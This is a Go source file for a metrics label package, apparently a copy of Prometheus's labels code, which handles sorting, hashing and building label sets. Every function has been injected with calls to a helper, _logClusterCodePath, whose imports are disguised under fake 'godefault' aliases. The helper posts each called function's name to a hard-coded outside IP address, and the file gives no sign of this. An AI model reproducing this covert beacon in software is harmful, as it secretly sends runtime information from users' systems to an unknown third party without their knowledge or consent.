package labels

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"encoding/json"
	"sort"
	"strconv"
	"strings"
	"github.com/cespare/xxhash"
)

const sep = '\xff'
const (
	MetricName		= "__name__"
	AlertName		= "alertname"
	BucketLabel		= "le"
	InstanceName	= "instance"
)

type Label struct{ Name, Value string }
type Labels []Label

func (ls Labels) Len() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return len(ls)
}
func (ls Labels) Swap(i, j int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ls[i], ls[j] = ls[j], ls[i]
}
func (ls Labels) Less(i, j int) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ls[i].Name < ls[j].Name
}
func (ls Labels) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var b bytes.Buffer
	b.WriteByte('{')
	for i, l := range ls {
		if i > 0 {
			b.WriteByte(',')
			b.WriteByte(' ')
		}
		b.WriteString(l.Name)
		b.WriteByte('=')
		b.WriteString(strconv.Quote(l.Value))
	}
	b.WriteByte('}')
	return b.String()
}
func (ls Labels) MarshalJSON() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return json.Marshal(ls.Map())
}
func (ls *Labels) UnmarshalJSON(b []byte) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var m map[string]string
	if err := json.Unmarshal(b, &m); err != nil {
		return err
	}
	*ls = FromMap(m)
	return nil
}
func (ls Labels) Hash() uint64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b := make([]byte, 0, 1024)
	for _, v := range ls {
		b = append(b, v.Name...)
		b = append(b, sep)
		b = append(b, v.Value...)
		b = append(b, sep)
	}
	return xxhash.Sum64(b)
}
func (ls Labels) HashForLabels(names ...string) uint64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b := make([]byte, 0, 1024)
	for _, v := range ls {
		for _, n := range names {
			if v.Name == n {
				b = append(b, v.Name...)
				b = append(b, sep)
				b = append(b, v.Value...)
				b = append(b, sep)
				break
			}
		}
	}
	return xxhash.Sum64(b)
}
func (ls Labels) HashWithoutLabels(names ...string) uint64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b := make([]byte, 0, 1024)
Outer:
	for _, v := range ls {
		if v.Name == MetricName {
			continue
		}
		for _, n := range names {
			if v.Name == n {
				continue Outer
			}
		}
		b = append(b, v.Name...)
		b = append(b, sep)
		b = append(b, v.Value...)
		b = append(b, sep)
	}
	return xxhash.Sum64(b)
}
func (ls Labels) Copy() Labels {
	_logClusterCodePath()
	defer _logClusterCodePath()
	res := make(Labels, len(ls))
	copy(res, ls)
	return res
}
func (ls Labels) Get(name string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, l := range ls {
		if l.Name == name {
			return l.Value
		}
	}
	return ""
}
func (ls Labels) Has(name string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, l := range ls {
		if l.Name == name {
			return true
		}
	}
	return false
}
func Equal(ls, o Labels) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(ls) != len(o) {
		return false
	}
	for i, l := range ls {
		if l.Name != o[i].Name || l.Value != o[i].Value {
			return false
		}
	}
	return true
}
func (ls Labels) Map() map[string]string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m := make(map[string]string, len(ls))
	for _, l := range ls {
		m[l.Name] = l.Value
	}
	return m
}
func New(ls ...Label) Labels {
	_logClusterCodePath()
	defer _logClusterCodePath()
	set := make(Labels, 0, len(ls))
	for _, l := range ls {
		set = append(set, l)
	}
	sort.Sort(set)
	return set
}
func FromMap(m map[string]string) Labels {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := make([]Label, 0, len(m))
	for k, v := range m {
		l = append(l, Label{Name: k, Value: v})
	}
	return New(l...)
}
func FromStrings(ss ...string) Labels {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(ss)%2 != 0 {
		panic("invalid number of strings")
	}
	var res Labels
	for i := 0; i < len(ss); i += 2 {
		res = append(res, Label{Name: ss[i], Value: ss[i+1]})
	}
	sort.Sort(res)
	return res
}
func Compare(a, b Labels) int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := len(a)
	if len(b) < l {
		l = len(b)
	}
	for i := 0; i < l; i++ {
		if d := strings.Compare(a[i].Name, b[i].Name); d != 0 {
			return d
		}
		if d := strings.Compare(a[i].Value, b[i].Value); d != 0 {
			return d
		}
	}
	return len(a) - len(b)
}

type Builder struct {
	base	Labels
	del		[]string
	add		[]Label
}

func NewBuilder(base Labels) *Builder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Builder{base: base, del: make([]string, 0, 5), add: make([]Label, 0, 5)}
}
func (b *Builder) Del(ns ...string) *Builder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, n := range ns {
		for i, a := range b.add {
			if a.Name == n {
				b.add = append(b.add[:i], b.add[i+1:]...)
			}
		}
		b.del = append(b.del, n)
	}
	return b
}
func (b *Builder) Set(n, v string) *Builder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for i, a := range b.add {
		if a.Name == n {
			b.add[i].Value = v
			return b
		}
	}
	b.add = append(b.add, Label{Name: n, Value: v})
	return b
}
func (b *Builder) Labels() Labels {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(b.del) == 0 && len(b.add) == 0 {
		return b.base
	}
	res := make(Labels, 0, len(b.base))
Outer:
	for _, l := range b.base {
		for _, n := range b.del {
			if l.Name == n {
				continue Outer
			}
		}
		for _, la := range b.add {
			if l.Name == la.Name {
				continue Outer
			}
		}
		res = append(res, l)
	}
	res = append(res, b.add...)
	sort.Sort(res)
	return res
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
